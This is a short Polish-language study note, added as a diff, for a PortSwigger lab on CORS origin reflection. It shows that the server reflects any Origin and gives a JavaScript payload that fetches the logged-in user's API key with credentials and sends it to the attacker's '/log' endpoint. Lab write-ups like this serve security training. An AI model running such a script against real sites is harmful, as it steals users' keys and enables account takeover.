@@ -1,0 +1,27 @@
+1. Dodajemy naglowek do requestu
+Origin: https://costam.com
+
+Server odpowiada dodatkowym naglowkiem:
+Access-Control-Allow-Origin: http://costam.com
+
+Czyli nie sprawdza Originu mozemy machnac zlosliwy skrypt
+
+
+[Ustalilismy adres z ktorego jest zwracany API do aplikacji i piszemy skrypt]
+[Skrypt wykona zapytanie o klucz API zalogowanego uzytkownika a nastepnie przesle dane do naszego zlego servera :)]
+
+<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','$url/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+
+    function reqListener() {
+        location='/log?key='+this.responseText;
+    };
+</script>
+
+
+
+(https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)
